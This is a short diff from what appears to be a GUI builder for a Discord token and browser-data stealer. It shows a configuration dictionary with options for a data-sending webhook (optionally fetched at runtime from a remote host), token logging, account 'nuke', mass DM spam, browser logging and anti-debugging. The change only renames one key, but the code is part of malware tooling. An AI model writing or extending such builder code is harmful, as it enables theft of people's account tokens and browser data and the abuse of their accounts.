@@ -294,7 +294,7 @@ class App(customtkinter.CTk):
             "WEBHOOK": f'"{webhook}"' if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
             "TOKEN_LOGGER": token_logger,
             "NUKE_TOKEN": auto_nuke,
-            "MASSDM": massdm,
+            "MASSDM_BOOL": massdm,
             "MASSDM_SCRIPT": massdm_script,
             "BROWSER_LOGGER": browser,
             "ANTI_DEBUG": debug,
